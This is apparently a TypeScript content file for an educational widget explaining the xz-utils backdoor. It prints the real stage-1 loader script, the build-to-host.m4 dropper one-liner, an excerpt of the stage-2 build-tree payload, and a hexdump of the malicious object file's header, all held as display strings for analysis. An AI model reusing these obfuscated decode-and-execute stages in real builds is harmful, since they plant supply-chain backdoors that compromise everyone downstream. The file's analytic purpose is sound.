/*
 * Verified content for the §3 payload-chain widget.
 *
 * Every string here was extracted from a real artifact in xz-artifacts/ and
 * cross-checked against project_xz_payload_facts.md (which itself ties back
 * to Russ Cox xz-script + Sam James + Andres Freund).
 *
 *   stage-1.sh   sha256 4a26bbce…0f6e6   ← from xz-artifacts/stages/01-stage1.sh
 *   stage-2.sh   sha256 654c673c…0bbf6a1 ← from xz-artifacts/stages/02-stage2.sh
 *   .o (xzre)    sha256 b418bfd3…4963    ← from xz-artifacts/analysis/xzre/
 *
 * Binarly's distro-extracted .o hash (cbeef92e…3537) differs by bytes but
 * carries the same backdoor structurally — see footnote on the ELF card.
 */

export type Role = "attacker" | "defender";

export interface Artifact {
  id: string;
  name: string;
  role: Role;
  roleLabel: string;
  size: string;
  sha: string;
  shaFull: string;
  blurb: string;
  /** What the "decoded" tab shows. */
  code: string;
  /** Shiki language for `code`. */
  lang: string;
  /** Caption shown in the code block header on the default tab. */
  capLeft: string;
  /** True for the ELF hex view — disables Shiki, renders verbatim. */
  isHex?: boolean;
  /** Label for the main tab. Required when `altTab` is set. */
  mainTabLabel?: string;
  /** Optional alt-tab content (e.g. dropper one-liner, header decode). */
  altTab?: {
    id: string;
    label: string;
    cap: string;
    code: string;
    lang: string;
  };
}

/* Stage-1 — verbatim content of xz-artifacts/stages/01-stage1.sh.
   The raw file (1330 bytes) has 8 non-printable bytes between the cover
   markers; rendered here as a comment line so the display stays readable. */

const STAGE1_5_6_1 = `####Hello####
# e5 55 89 b7 24 04 d8 17   (8 non-printable bytes; bash treats the line as a comment)
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval \`grep ^srcdir= config.status\`
if test -f ../../config.status; then
  eval \`grep ^srcdir= ../../config.status\`
  srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +2048 \\
  && (head -c +1024 >/dev/null) && head -c +939)"
(xz -dc $srcdir/tests/files/good-large_compressed.lzma \\
  | eval $i \\
  | tail -c +31233 \\
  | tr "\\\\114-\\\\321\\\\322-\\\\377\\\\35-\\\\47\\\\14-\\\\34\\\\0-\\\\13\\\\50-\\\\113" "\\\\0-\\\\377" \\
) | xz -F raw --lzma1 -dc | /bin/sh
####World####`;

/* ─── 5.6.0 differs in three places only (Russ Cox xz-script confirms): ───
   - final head chunk: +724 instead of +939
   - tail offset:      +31265 instead of +31233
   - tr table:         "\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131"
*/
const STAGE1_5_6_0 = STAGE1_5_6_1.replace("head -c +939)", "head -c +724)")
  .replace("tail -c +31233", "tail -c +31265")
  .replace(
    'tr "\\\\114-\\\\321\\\\322-\\\\377\\\\35-\\\\47\\\\14-\\\\34\\\\0-\\\\13\\\\50-\\\\113"',
    'tr "\\\\5-\\\\51\\\\204-\\\\377\\\\52-\\\\115\\\\132-\\\\203\\\\0-\\\\4\\\\116-\\\\131"',
  );

const DROPPER_ONELINER = `# What build-to-host.m4 actually runs. Hidden inside an autoconf macro
# in the tarball, NOT in the git tree.
tr "\\t \\-_" " \\t_\\-" < bad-3-corrupt_lzma2.xz | xz -d`;

/* Stage-2 head — lines 1–40 of xz-artifacts/stages/02-stage2.sh.
   Whitespace only: the source file has no indentation; we add it here so the
   nested if/then structure is legible. No commands or order changed. */
const STAGE2_HEAD = `P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\\" $P\\""
O="^pic_flag=\\" -fPIC -DPIC\\"\$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"

[ ! $(uname)="Linux" ] && exit 0

eval \$zrKcVq
if test -f config.status; then
  eval \$zrKcSS
  eval \`grep ^LD=\\'\\/ config.status\`
  eval \`grep ^CC=\\' config.status\`
  eval \`grep ^GCC=\\' config.status\`
  eval \`grep ^srcdir=\\' config.status\`
  eval \`grep ^build=\\'x86_64 config.status\`
  eval \`grep ^enable_shared=\\'yes\\' config.status\`
  eval \`grep ^enable_static=\\' config.status\`
  eval \`grep ^gl_path_map=\\' config.status\`

  vs=\`grep -broaF '~!:_ W' \$srcdir/tests/files/ 2>/dev/null\`
  if test "x\$vs" != "x" > /dev/null 2>&1; then
    f1=\`echo \$vs | cut -d: -f1\`
    if test "x\$f1" != "x" > /dev/null 2>&1; then
      start=\`expr \$(echo \$vs | cut -d: -f2) + 7\`
      ve=\`grep -broaF '|_!{ -' \$srcdir/tests/files/ 2>/dev/null\`
      if test "x\$ve" != "x" > /dev/null 2>&1; then
        f2=\`echo \$ve | cut -d: -f1\`
        if test "x\$f2" != "x" > /dev/null 2>&1; then
          [ ! "x\$f2" = "x\$f1" ] && exit 0
          [ ! -f \$f1 ] && exit 0
          end=\`expr \$(echo \$ve | cut -d: -f2) - \$start\`
          eval \`cat \$f1 \\
            | tail -c +\${start} | head -c +\${end} \\
            | tr "\\\\5-\\\\51\\\\204-\\\\377\\\\52-\\\\115\\\\132-\\\\203\\\\0-\\\\4\\\\116-\\\\131" "\\\\0-\\\\377" \\
            | xz -F raw --lzma2 -dc\`
        fi
      fi
    fi
  fi
fi

eval \$zrKccj
if ! grep -qs '\\["HAVE_FUNC_ATTRIBUTE_IFUNC"\\]=" 1"' config.status > /dev/null 2>&1; then
  exit 0
fi
# … 208 more lines in 02-stage2.sh …`;

/* ─── ELF first 256 bytes — byte-accurate, generated from the real .o ──────
   hexdump -C -n 256 xz-artifacts/analysis/xzre/liblzma_la-crc64-fast.o
*/
const ELF_HEX = `00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  01 00 3e 00 01 00 00 00  00 00 00 00 00 00 00 00  |..>.............|
00000020  00 00 00 00 00 00 00 00  d8 1d 01 00 00 00 00 00  |................|
00000030  00 00 00 00 40 00 00 00  00 00 40 00 f2 00 f1 00  |....@.....@.....|
00000040  04 00 00 00 10 00 00 00  05 00 00 00 47 4e 55 00  |............GNU.|
00000050  02 00 00 c0 04 00 00 00  03 00 00 00 00 00 00 00  |................|
00000060  f3 0f 1e fa 41 54 b9 02  00 00 00 49 89 f4 be 12  |....AT.....I....|
00000070  00 00 00 55 48 89 d5 ba  46 00 00 00 53 48 89 fb  |...UH...F...SH..|
00000080  31 ff 48 83 ec 20 e8 00  00 00 00 85 c0 0f 84 b3  |1.H.. ..........|
00000090  05 00 00 33 c0 b9 16 00  00 00 48 8b fb 4c 89 e2  |...3......H..L..|
000000a0  f3 ab 49 39 ec 0f 83 3a  0a 00 00 0f b6 02 3c 67  |..I9...:......<g|
000000b0  77 3b 3c 2d 77 12 3c 0f  0f 84 ca 00 00 00 3c 26  |w;<-w.<.......<&|
000000c0  0f 85 0b 01 00 00 eb 5f  48 be 01 01 01 00 00 00  |......._H.......|
000000d0  c0 00 8d 48 d2 48 0f a3  ce 72 4c 3c 67 0f 84 87  |...H.H...rL<g...|
000000e0  00 00 00 3c 66 0f 85 d3  00 00 00 eb 52 3c f0 74  |...<f.......R<.t|
000000f0  1e 77 11 8d 48 3c 80 f9  01 0f 86 95 00 00 00 e9  |.w..H<..........|`;

const ELF_HEADER_DECODED = `# liblzma_la-crc64-fast.o — header fields read out of the first 64 bytes.
e_ident[EI_MAG]    = 0x7F 0x45 0x4C 0x46     # "ELF" magic
e_ident[EI_CLASS]  = 0x02                     # ELFCLASS64
e_ident[EI_DATA]   = 0x01                     # ELFDATA2LSB (little-endian)
e_ident[EI_VERSION]= 0x01                     # EV_CURRENT
e_ident[EI_OSABI]  = 0x00                     # ELFOSABI_NONE (System V)

e_type      = 0x0001                          # ET_REL — relocatable .o
e_machine   = 0x003E                          # EM_X86_64
e_version   = 0x00000001                      # EV_CURRENT
e_entry     = 0x0                             # no entry point (it is a .o)
e_phoff     = 0x0                             # no program headers
e_shoff     = 0x00011DD8                      # section headers at offset 73176
e_flags     = 0x0
e_ehsize    = 0x0040                          # 64-byte header
e_phentsize = 0x0
e_phnum     = 0x0
e_shentsize = 0x0040                          # 64-byte section header entries
e_shnum     = 0x00F2  ─────────►  242 sections (the fingerprint)
e_shstrndx  = 0x00F1                          # section-name string table is #241`;

export interface VersionParams {
  label: string;
  stage1: string;
  fixtureSha: string;
  fixtureShaFull: string;
  droppedAt: string;
}

export type XzVersion = "5.6.0" | "5.6.1";

export const VERSIONS: Record<XzVersion, VersionParams> = {
  "5.6.1": {
    label: "xz-5.6.1",
    stage1: STAGE1_5_6_1,
    fixtureSha: "ecda10d8…16bd",
    fixtureShaFull:
      "ecda10d8877d555dbda4a4eba329e146b2be8ac4b7915fb723eaacc9f89d16bd",
    droppedAt: "2024-03-09",
  },
  "5.6.0": {
    label: "xz-5.6.0",
    stage1: STAGE1_5_6_0,
    fixtureSha: "a18585a9…7e6c",
    fixtureShaFull: "documented in Russ Cox xz-script (5.6.0 fixture differs)",
    droppedAt: "2024-02-23",
  },
};

export const ARTIFACTS: Artifact[] = [
  {
    id: "fixture",
    name: "bad-3-corrupt_lzma2.xz",
    role: "attacker",
    roleLabel: "fixture",
    size: "512 B",
    sha: VERSIONS["5.6.1"].fixtureSha,
    shaFull: VERSIONS["5.6.1"].fixtureShaFull,
    blurb:
      "Test fixture in tests/files/. Three xz streams; the second one is the obfuscated Stage-1 shell script. The tr swap in build-to-host.m4 reverses the obfuscation.",
    code: DROPPER_ONELINER,
    lang: "shellscript",
    capLeft: 'tr "\\t \\-_" " \\t_\\-" < bad-3-corrupt_lzma2.xz | xz -d',
  },
  {
    id: "stage1",
    name: "Stage-1 (shell)",
    role: "attacker",
    roleLabel: "shell",
    size: "1.3 KiB",
    sha: "4a26bbce…0f6e6",
    shaFull: "4a26bbcee218698a3a7fb62f3b66b4c193e53243699816e9348e063849b0f6e6",
    blurb:
      "Skip 1024 / keep 2048, sixteen times over good-large_compressed.lzma, then tail -c +31233, a tr substitution, and raw lzma1 decompression piped to /bin/sh.",
    code: STAGE1_5_6_1,
    lang: "shellscript",
    capLeft: "stage1.sh — pipeline assembly",
  },
  {
    id: "stage2",
    name: "Stage-2 (shell)",
    role: "attacker",
    roleLabel: "shell",
    size: "9.3 KiB",
    sha: "654c673c…bbf6a1",
    shaFull: "654c673c177a2a06c2b240ee07f81dc9096b1626f82855dc67722a5e10bbf6a1",
    blurb:
      "Stage-2 is the build-time payload. It runs gating checks (Linux x86_64, gcc + glibc, IFUNC support) and overwrites the matching .o inside the autotools build tree.",
    code: STAGE2_HEAD,
    lang: "shellscript",
    capLeft: "stage2.sh — gating + dropper (excerpt)",
  },
  {
    id: "elf",
    name: "liblzma_la-crc64-fast.o",
    role: "defender",
    roleLabel: "verified",
    size: "86.6 KiB",
    sha: "b418bfd3…4963",
    shaFull: "b418bfd34aa246b2e7b5cb5d263a640e5d080810f767370c4d2c24662a274963",
    blurb:
      "ELF64 relocatable (e_type = ET_REL), 242 sections. Linked into liblzma.so.5.6.1 in place of the upstream crc64-fast.o.",
    code: ELF_HEX,
    lang: "plaintext",
    capLeft: "liblzma_la-crc64-fast.o — first 256 bytes",
    isHex: true,
    mainTabLabel: "bytes",
    altTab: {
      id: "header",
      label: "header fields",
      cap: "liblzma_la-crc64-fast.o — header decoded",
      code: ELF_HEADER_DECODED,
      lang: "shellscript",
    },
  },
];
